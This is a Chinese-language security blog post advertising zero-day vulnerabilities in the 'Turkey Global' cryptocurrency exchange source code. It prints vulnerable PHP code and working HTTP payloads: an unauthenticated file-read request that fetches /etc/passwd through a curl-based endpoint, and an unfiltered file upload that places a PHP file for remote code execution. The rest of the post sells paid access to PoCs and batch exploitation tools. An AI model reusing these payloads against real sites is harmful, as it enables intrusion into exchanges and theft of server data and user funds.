#  【0day】Turkey Global全开源9语言交易所审计   
 阿乐你好   2025-05-13 01:00  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x00 前言  
  
项目编号-10004   漏洞评估:9.8  
  
**Turkey Global全开源9语言交易所源码/币币交易/合约交易/秒合约交易/C2C交易/新币认购/理财，后端是fastadmin框架，计划任务用的是宝塔的监控插件，手机端没有k线，pc端有实时k线，但是pc里面k线的行情图有报错，程序自带了在线客服的插件.**  
  
****  
Fofa指纹:  
暂不公开  
  
![2025050618463073.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5c4fkZgjHUib1wDRvG3umBAcQRMIdDWsOFm0Mnmcnv4QafGEdQeb7fY08IQ2wK7cNYfXSjebpVyDVQ/640?wx_fmt=other&from=appmsg "")  
![202505061846087.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5c4fkZgjHUib1wDRvG3umBAcibVQrrK27Ckf6VttKmib4qf0Yc72r17BFwQnic1XI56JVHFeOiaJtNfiaLA/640?wx_fmt=other&from=appmsg "")  
![2025050618454085.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5c4fkZgjHUib1wDRvG3umBAcDJClRiaGSNUk0y5bCnFj78vNxTrUvmetocydXCgkmMl0dktThEI7ZPw/640?wx_fmt=other&from=appmsg "")  
  
**框架:ThinkPHP 5.0.24 Debug:True**  
## 0x01 前台任意文件读取漏洞  
位于 /application/api/controller/Fanyi.php 控制器的 callOnce 方法通过传入url参数，进入curl_exec 中，导致漏洞产生.public function callOnce($url, $args=null, $method="post", $withCookie = false, $timeout = 10, $headers=array())  {/*{{{*/   $ch = curl_init();   if($method == "post")    {     $data = $this->convert($args);     curl_setopt($ch, CURLOPT_POSTFIELDS, $data);     curl_setopt($ch, CURLOPT_POST, 1);   }   else   {     $data = $this->convert($args);     if($data)      {       if(stripos($url, "?") > 0)        {         $url .= "&$data";       }       else       {         $url .= "?$data";       }     }   }   curl_setopt($ch, CURLOPT_URL, $url);   curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);   if(!empty($headers))    {     curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);   }   if($withCookie)   {     curl_setopt($ch, CURLOPT_COOKIEJAR, $_COOKIE);   }   $r = curl_exec($ch);   curl_close($ch);   return $r;  }  
**Payload:**  
```
GET /api/fanyi/callOnce?url=file:///etc/passwd HTTP/1.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7Cache-Control: no-cacheConnection: keep-aliveHost: 192.168.200.128Pragma: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5c4fkZgjHUib1wDRvG3umBAcG1qsichW5It49bXy3qIDIBICgwnGyNYP6zuDGMJTzPwRjDZ203lmk0w/640?wx_fmt=png&from=appmsg "")  
## 0x02 前台RCE漏洞  
  
位于 /*****/*****/*****/***** 的FileUpload方法存在任意文件上传漏洞，且未加过滤，导致漏洞产生.  
  
Payload:  
  
```
POST /***/***/****/****/fileUpload HTTP/1.1Host: 192.168.200.128Content-Length: 997User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHx58bwavVjamnK8oAccept: */*Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close------WebKitFormBoundaryHx58bwavVja...... 完整Payload在文末------WebKitFormBoundaryHx58bwavVjaContent-Disposition: form-data; name="file"; filename="1.php"Content-Type: application/octet-stream<?php phpinfo();?>------WebKitFormBoundaryHx58bwavVjamnK8o--
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5c4fkZgjHUib1wDRvG3umBAczlUuy27bzwfQA8DjY9nnsNagFMG1wmOHMcSvgavB4172dbuvwSInwA/640?wx_fmt=png&from=appmsg "")  
  
文件写入到  /1.php 访问即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5c4fkZgjHUib1wDRvG3umBAcHsqVXraTlqVto2jMRtt65hfAnvN4LLJk60PO01faKpicqicMsibYgiaMBw/640?wx_fmt=png&from=appmsg "")  
## 0x02 知识星球  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转**  
  
  
完整POC及源码已放在知识星球中，需要可自取!!!  
  
**高质量漏洞利用研究，代码审计圈子，每周至少更新三个0Day/Nday及对应漏洞的批量利用工具，团队内部POC，源码分享，星球不定时更新内外网攻防渗透技巧以及最新学习，SRC研究报告等。**  
  
**【圈子权益】**  
  
**1，一年至少999+漏洞Poc及对应漏洞批量利用工具**  
  
**2，各种漏洞利用工具及后续更新，渗透工具、文档资源分享**  
  
**3，内部漏洞库情报分享（目前已有150000+poc，会每日更新，包括部分未公开0/1day）**  
  
**4，加入内部微信群，遇到任何技术问题都可以进行快速提问、讨论交流；**  
  
**5，Fofa API 高级会员Key共享**  
  
**6,  高自动化代码审计工具共享**  
  
**圈子目前价格为已降价至129元，现在星球有1000+位师傅相信并选择加入我们**  
  
****  
**网站源码及漏洞库已于2025.5.12日更新**  
  
****  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5efdn10OrI6KuJRynyF3BIhdAXFwVWOKu2WkpehPyeW6H8u2unE5Tg297xNHhicv7y4dE1rXmHGGCQ/640?wx_fmt=jpeg&from=appmsg "")  
  
Fofa 高级会员 Key****  
  
****  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5c4fkZgjHUib1wDRvG3umBAcBUsQ86RewiciagSqyGFsD5GrPCKC6lop95HuichOjFVkgo0VuQvedibEcg/640?wx_fmt=png&from=appmsg "")  
  
超多审计资料，自动化审计工具  
  
![319d33192f5a9f019ec3f7a17cc25bb.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5fOtUasHrnibBFTUkOIJJH5Goe8FhSg3arBlw7QLWsJl3xiczb5QnWfRKiaSvcMBPHLuwFjkWuuFicDwQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dVAUWP6LibARs3usK4kNz6g367ZEv3pT7cv8fl3YHMZH47sBH2IMy1J2XYeMNVXDJgLhP1yahI4pw/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dPFicRheSpuSsBE8ZFeE6HwYQ7XZx91DUHD6M2jFjo9jwxZEnQs2PaU9jQAvYicVxtcIiaKI2QeRxqA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
****  
**圈子内部漏********洞库(日更)**  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dO3JY3ibuSzzKb6JXHOsho8GllKEjcqXnSa6OY73aptxTiaibrLiaKrw85bDlFrRjR8aUGrxZKVQBTug/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**每篇文章均有完整指纹和详细POC**  
  
****  
**一起愉快地刷分**  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ff43kUoicsmnll86ficaMcTp1nDJvFuhT6INWEyGaCkEEclfEo8Ld6OBOzzJ3BkTVbrfqd41XhAhicA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dPFicRheSpuSsBE8ZFeE6HwwvkuIIecPQwHta0wibQuCqoSTqsc2K1KZDpJb3enDibBiau4EEhxrTYxA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ff43kUoicsmnll86ficaMcTpt1uZwVAmW8XEscyvU51uc9sdiaHViaJKMEZyiaM4bAaQfGIPNd26u2A5w/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**上千套审计源码，包括各种协同办公OA**  
  
****  
**入圈之后可私信我帮你开通永久VIP，已开通各大源码站VIP**  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ddnP3GPD4EFbjricqxLYKEMbdFQjC7ZWqVCo8nDCz3kL1UhibTicP4Nmb2fa2RmsYHtXUiacMlkYkCNg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dbasJicXJDEOR85icHkfIda3gg2HpaWjW2MZN9KZdGzX99Ofl7SRETFA4TicFabIO2UGibSONn6bhXQw/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
****  
**高质量代码审计社区**  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5eYsOmVcqiczEs2xZkicGt1u6HibInHPVngJzcM5jLf64ncdDFEN0Sfzo5jFkUspBiaCTftaSsheb5JIQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转**  
  
**PS:关注公众号，持续更新漏洞文章**  
  
  
**免责声明:****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
